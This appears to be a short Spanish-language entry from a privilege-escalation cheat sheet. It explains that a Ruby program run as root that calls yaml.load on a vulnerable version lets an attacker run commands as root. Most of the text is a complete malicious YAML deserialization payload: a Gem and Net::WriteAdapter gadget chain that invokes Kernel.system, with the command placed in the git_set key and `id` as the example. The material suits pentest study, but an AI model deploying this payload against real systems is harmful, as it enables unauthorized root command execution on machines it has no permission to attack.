Si podemos ejecutar como root algún programa que en ruby que haga uso de yaml.load y nuestra versión de yaml es vulnerable, podremos ejecutar comandos como root y por tanto elevar privilegios.

## Archivo yaml malicioso


 El comando que se ejecutará está en la clave `git_set`, en este caso ejecutará `id`
 
``` yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve

```

